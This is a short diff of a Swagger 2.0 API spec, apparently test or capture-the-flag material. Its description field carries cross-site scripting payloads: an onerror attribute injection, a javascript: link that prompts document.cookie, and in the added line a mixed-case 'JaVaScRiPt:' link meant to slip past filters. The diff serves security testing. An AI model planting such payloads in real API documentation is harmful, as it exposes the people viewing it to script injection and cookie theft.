@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: You must login before continuing 😱!
   description: |
-    **Note:** You must be logged in to access these resources. For more details, visit our [documentation](https://collectingflags.com/redirect.php) ![Uh oh...]("onerror="alert('XSS') [documentation2](javascript:prompt(document.cookie))
+    **Note:** You must be logged in to access these resources. For more details, visit our [documentation](JaVaScRiPt:alert('CaseInsensitive'))
   version: production
 basePath: /Submit/
 produces:
